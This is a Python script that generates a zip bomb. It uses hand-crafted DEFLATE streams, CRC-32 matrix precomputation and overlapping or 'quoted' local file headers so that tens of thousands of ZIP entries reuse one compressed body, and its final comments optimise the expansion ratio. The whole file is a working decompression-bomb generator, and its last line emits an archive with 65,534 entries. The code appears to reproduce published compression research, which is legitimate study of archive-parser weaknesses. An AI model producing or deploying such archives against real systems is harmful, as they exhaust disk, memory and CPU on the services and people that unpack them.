#!/usr/bin/env python3

import binascii
import struct
import sys


CHOSEN_BYTE = ord(b"A") # homage to 42.zip


# CRC-32 precomputation using matrices in GF(2). Similar to crc32_combine in
# zlib. See https://stackoverflow.com/a/23126768 for a description of the idea.
# Here, we use a 33-bit state where the dummy 33rd coordinate is always 1
# (similar to homogeneous coordinates). Matrices are represented as 33-element
# lists, where each element is a 33-bit integer representing one column.

CRC_POLY = 0xedb88320

def matrix_mul_vector(m, v):
    r = 0
    for shift in range(len(m)):
        if (v>>shift) & 1 == 1:
            r ^= m[shift]
    return r

def matrix_mul(a, b):
    assert len(a) == len(b)
    return [matrix_mul_vector(a, v) for v in b]

def identity_matrix():
    return [1<<shift for shift in range(33)]

# Matrix that updates CRC-32 state for a 0 bit.
CRC_M0 = [CRC_POLY] + [1<<shift for shift in range(31)] + [1<<32]
# Matrix that flips the LSb (x^31 in the polynomial).
CRC_MFLIP = [1<<shift for shift in range(32)] + [(1<<32) + 1]
# Matrix that updates CRC-32 state for a 1 bit: flip the LSb, then act as for a 0 bit.
CRC_M1 = matrix_mul(CRC_M0, CRC_MFLIP)

def precompute_crc_matrix(data):
    m = identity_matrix()
    for b in data:
        for shift in range(8):
            m = matrix_mul([CRC_M0, CRC_M1][(b>>shift)&1], m)
    return m

def precompute_crc_matrix_repeated(data, n):
    accum = precompute_crc_matrix(data)
    # Square-and-multiply algorithm to compute m = accum^n.
    m = identity_matrix()
    while n > 0:
        if n & 1 == 1:
            m = matrix_mul(m, accum)
        accum = matrix_mul(accum, accum)
        n >>= 1
    return m

def crc_matrix_apply(m, value=0):
    return (matrix_mul_vector(m, (value^0xffffffff)|(1<<32)) & 0xffffffff) ^ 0xffffffff


# DEFLATE stuff, see RFC 1951.

class BitBuffer:
    def __init__(self):
        self.done = []
        self.current = 0
        self.bit_pos = 0

    def push(self, x, n):
        assert x == x % (1<<n), (bin(x), n)
        while n >= (8 - self.bit_pos):
            self.current |= (x << self.bit_pos) & 0xff
            x >>= (8 - self.bit_pos)
            n -= (8 - self.bit_pos)
            self.done.append(self.current)
            self.current = 0
            self.bit_pos = 0
        self.current |= (x << self.bit_pos) & 0xff
        self.bit_pos += n

    def push_rev(self, x, n):
        mask = (1<<n)>>1
        while mask > 0:
            self.push(x&mask != 0 and 1 or 0, 1)
            mask >>= 1

    def bytes(self):
        out = bytes(self.done)
        if self.bit_pos != 0:
            out += bytes([self.current])
        return out

# RFC 1951 section 3.2.2. Input is a sym: length dict and output is a
# sym: (code, length) dict.
def huffman_codes_from_lengths(sym_lengths):
    bl_count = {}
    max_length = 0
    for _, length in sym_lengths.items():
        bl_count.setdefault(length, 0)
        bl_count[length] += 1
        max_length = max(max_length, length)

    next_code = {}
    code = 0
    for length in range(max_length):
        code = (code + bl_count.get(length, 0)) << 1
        next_code[length+1] = code

    result = {}
    for sym, length in sorted(sym_lengths.items(), key=lambda x: (x[1], x[0])):
        assert next_code[length] >> length == 0, (sym, bin(next_code[length]), length)
        result[sym] = next_code[length], length
        next_code[length] += 1
    return result

def print_huffman_codes(sym_codes, **kwargs):
    max_sym_length = max(len("{}".format(sym)) for sym in sym_codes)
    for sym, code in sorted(sym_codes.items()):
        code, length = code
        print("{:{}}: {:0{}b}".format(sym, max_sym_length, code, length), **kwargs)

# Return a block of data whose compressed size is as specified. Returns a tuple
# (compressed_data, uncompressed_size, crc_matrix).
def get_compressed(compressed_size, final=1):
    # Huffman tree for code lengths.
    code_length_lengths = {
         0: 2,
         1: 3,
         2: 3,
        18: 1,
    }
    code_length_codes = huffman_codes_from_lengths(code_length_lengths)
    # print_huffman_codes(code_length_codes, file=sys.stderr)

    # Huffman tree for literal/length values.
    ll_lengths = {
        CHOSEN_BYTE: 2, # literal byte
                256: 2, # end of stream
                285: 1, # copy 285 bytes
    }
    # print_huffman_codes(huffman_codes_from_lengths(ll_lengths), file=sys.stderr)

    # Huffman tree for distance codes.
    distance_lengths = {
        0: 1,   # distance 1
    }
    # print_huffman_codes(huffman_codes_from_lengths(distance_lengths), file=sys.stderr)

    bits = BitBuffer()
    # BFINAL
    bits.push(0b1, final and 1 or 0)
    # BTYPE=10: dynamic Huffman codes
    bits.push(0b10, 2)
    # HLIT is 257 less than the number of literal/length codes
    bits.push(max(ll_lengths) + 1 - 257, 5)
    # HDIST is 1 less than the number of distance codes
    bits.push(max(distance_lengths) + 1 - 1, 5)
    # HCLEN is 4 less than the number of code length codes
    CODE_LENGTH_ALPHABET = (16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15)
    num_code_length_codes = max(CODE_LENGTH_ALPHABET.index(sym) for sym in code_length_lengths) + 1
    bits.push(num_code_length_codes - 4, 4)

    # Output Huffman tree for code lengths.
    for code_length in CODE_LENGTH_ALPHABET[:num_code_length_codes]:
        bits.push(code_length_lengths.get(code_length, 0), 3)

    # Skip n literal/length slots. Assumes we have length codes for 0 and 18.
    def skip(n):
        while n >= 11:
            if n < 138:
                x = n
            elif n < 138 + 11 and code_length_lengths[18] < (n - 138) * code_length_lengths[0]:
                # It'll be cheaper to cut this 18 block short and do the
                # remainder with another 18 block.
                x = n - 11
            else:
                x = 138
            bits.push_rev(*code_length_codes[18]) # 7 bits of length to follow
            bits.push(x - 11, 7)
            n -= x
        while n > 0:
            bits.push_rev(*code_length_codes[0])
            n -= 1
    # Output a Huffman tree in terms of code lengths.
    def output_code_length_tree(sym_lengths):
        cur = 0
        for sym, length in sorted(sym_lengths.items()):
            skip(sym - cur)
            bits.push_rev(*code_length_codes[length])
            cur = sym + 1

    # Output Huffman tree for literal/length values.
    output_code_length_tree(ll_lengths)

    # Output Huffman tree for distance codes.
    output_code_length_tree(distance_lengths)

    # A literal byte to start the whole process.
    bits.push_rev(0b10, 2)
    uncompressed_size = 1

    # Now every pair of 0 bits encodes 258 copies of CHOSEN_BYTE.
    is_even = bits.bit_pos % 2 == 0
    # Including whatever zero bits remain at the end of the bit buffer.
    uncompressed_size += (8 - bits.bit_pos) // 2 * 258
    prefix = bits.bytes()

    if is_even:
        suffix = bytes([0b11000000])
    else:
        suffix = bytes([0b01100000])
    # It takes 2 bits to encode the end of stream, which leaves 6 bits that
    # encode compressed data. In the !is_even case, 1 of the 6 bits is borrowed
    # from the prefix.
    uncompressed_size += 3 * 258

    body = b"\x00" * (compressed_size - len(prefix) - len(suffix))
    uncompressed_size += len(body) * 4 * 258

    compressed_data = prefix + body + suffix
    assert len(compressed_data) == compressed_size
    return compressed_data, uncompressed_size, precompute_crc_matrix_repeated(bytes([CHOSEN_BYTE]), uncompressed_size)


# APPNOTE.TXT 4.4.5
# 8 - The file is Deflated
COMPRESSION_METHOD_DEFLATE = 8

MOD_DATE = 0x0548
MOD_TIME = 0x6ca0

class LocalFileHeader:
    def __init__(self, compressed_size, uncompressed_size, crc, filename, extra_length):
        self.compressed_size = compressed_size
        self.uncompressed_size = uncompressed_size
        self.crc = crc
        self.filename = filename
        self.extra_length = extra_length

    def serialize(self):
        # APPNOTE.TXT 4.3.7
        return struct.pack("<LHHHHHLLLHH",
            0x04034b50, # signature
            20,         # zip version 2.0
            0,          # flags
            COMPRESSION_METHOD_DEFLATE, # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            self.compressed_size,   # compressed size
            self.uncompressed_size, # uncompressed size
            len(self.filename),     # filename length
            self.extra_length,      # extra length
        ) + self.filename

class CentralDirectoryHeader:
    # template is a LocalFileHeader instance.
    def __init__(self, local_file_header_offset, template):
        self.local_file_header_offset = local_file_header_offset
        self.compressed_size = template.compressed_size
        self.uncompressed_size = template.uncompressed_size
        self.crc = template.crc
        self.filename = template.filename

    def serialize(self):
        # APPNOTE.TXT 4.3.12
        return struct.pack("<LHHHHHHLLLHHHHHLL",
            0x02014b50, # signature
            20,         # version made by
            0,          # version needed to extract
            0,          # flags
            COMPRESSION_METHOD_DEFLATE, # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            self.compressed_size,   # compressed size
            self.uncompressed_size, # uncompressed size
            len(self.filename),     # filename length
            0,          # extra length
            0,          # file comment length
            0,          # disk number where file starts
            0,          # internal file attributes
            0,          # external file attributes
            self.local_file_header_offset,  # offset of local file header
        ) + self.filename

class EndOfCentralDirectory:
    def __init__(self, cd_num_entries, cd_size, cd_offset):
        self.cd_num_entries = cd_num_entries
        self.cd_size = cd_size
        self.cd_offset = cd_offset

    def serialize(self):
        # APPNOTE.TXT 4.3.16
        return struct.pack("<LHHHHLLH",
            0x06054b50, # signature
            0,          # number of this disk
            0,          # disk of central directory
            self.cd_num_entries,    # number of central directory entries on this disk
            self.cd_num_entries,    # number of central directory entries total
            self.cd_size,   # size of central directory
            self.cd_offset, # offset of central directory
            0,          # comment length
        )


FILENAME_LETTERS = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
def filename_for_index(i):
    letters = []
    while True:
        letters.insert(0, FILENAME_LETTERS[i % len(FILENAME_LETTERS)])
        i = i // len(FILENAME_LETTERS) - 1
        if i < 0:
            break
    return bytes(letters)

def write_zip_full_reuse(f, compressed_size, num_copies):
    compressed_data, uncompressed_size, crc_matrix = get_compressed(compressed_size)

    main_crc = crc_matrix_apply(crc_matrix)
    main_file = LocalFileHeader(len(compressed_data), uncompressed_size, main_crc, filename_for_index(0), 0)

    offset = 0
    main_file_offset = offset
    offset += f.write(main_file.serialize())
    offset += f.write(compressed_data)

    cd_offset = offset
    for i in range(num_copies):
        cd_header = CentralDirectoryHeader(main_file_offset, main_file)
        cd_header.filename = filename_for_index(i)
        offset += f.write(cd_header.serialize())
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(num_copies, cd_size, cd_offset).serialize())

    return offset

def write_zip_quoted_reuse(f, compressed_size, num_additional):
    class FileRecord:
        def __init__(self, header, data):
            self.header = header
            self.data = data

    # We build the file table backwards on a stack, starting with the file that
    # actually contains the bulk of the compressed data.
    files = []
    compressed_data, uncompressed_size, crc_matrix = get_compressed(compressed_size)
    header = LocalFileHeader(len(compressed_data), uncompressed_size, crc_matrix_apply(crc_matrix), filename_for_index(num_additional), 0)
    files.append(FileRecord(header, compressed_data))

    crc_matrix = precompute_crc_matrix_repeated(b"\x00", uncompressed_size)

    for i in range(num_additional):
        # The file that will follow this one is the one that has most recently
        # been added to the stack.
        next_file = files[-1]
        next_header_bytes = next_file.header.serialize()

        # Here we do a crc32_combine operation to compute the CRC of
        # prefix+remainder, knowing crc32(prefix), crc32(remainder), and a
        # matrix that computes the effect of len(remainder) 0x00 bytes.
        # Basically it's the xor of crc32(remainder) and crc32(prefix + zeroes),
        # where the latter quantity is the result of applying the matrix to
        # crc32(prefix).
        crc1 = binascii.crc32(next_header_bytes)
        crc2 = next_file.header.crc
        # Undo the pre- and post-conditioning that crc_matrix_apply does,
        # because crc1 and crc2 are already conditioned.
        new_crc = crc_matrix_apply(crc_matrix, crc1 ^ 0xffffffff) ^ 0xffffffff ^ crc2
        # Next file will have an additional len(next_header_bytes) accumulated
        # into crc_matrix.
        crc_matrix = matrix_mul(crc_matrix, precompute_crc_matrix_repeated(b"\x00", len(next_header_bytes)))

        # Place a non-final non-compressed DEFLATE block (BFINAL=0, BTYPE=00)
        # that quotes the following Local File Header and joins up with the
        # DEFLATE stream that it contains.
        quote = struct.pack("<BHH", 0x00, len(next_header_bytes), len(next_header_bytes) ^ 0xffff)
        header = LocalFileHeader(
            len(quote) + len(next_header_bytes) + next_file.header.compressed_size,
            len(next_header_bytes) + next_file.header.uncompressed_size,
            new_crc,
            filename_for_index(num_additional - i - 1),
            0,
        )
        files.append(FileRecord(header, quote))

    central_directory = []
    offset = 0
    while files:
        record = files.pop()
        central_directory.append(CentralDirectoryHeader(offset, record.header))
        offset += f.write(record.header.serialize())
        offset += f.write(record.data)

    cd_offset = offset
    for cd_header in central_directory:
        offset += f.write(cd_header.serialize())
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(len(central_directory), cd_size, cd_offset).serialize())

    return offset


# write_zip_full_reuse(sys.stdout.buffer, 21125+16, 442)
# write_zip_quoted_reuse(sys.stdout.buffer, 21078+16, 250)
write_zip_quoted_reuse(sys.stdout.buffer, 4159677+16, 65534)

# S compressed file data
# N * 30 Local File Headers
# N * 46 Central Directory Headers
# N * 2 * ~2 filenames
# (N-1) * 5 quotes
# 16 bytes DEFLATE overhead (represents 1033 bytes itself)
#
# maximize (1033 + (S - 16) * 1032) * N + 32 * (N - 1)
# subject to
#   16 + S + N * (30 + 46 + 4) + (N-1)*5 + 22 <= 42374
#
# max (33 + (S - 15) * 1032) * N - 32
#     (1032*S - 15447) * N
#     (1032*(42331 - 85*N) - 15447) * N
#     43670115*N - 87720*N*N
#     => max integer N at N=250 => S=21081
#
#   S = 42331 - 85*N
#   N = (42331 - S)/85
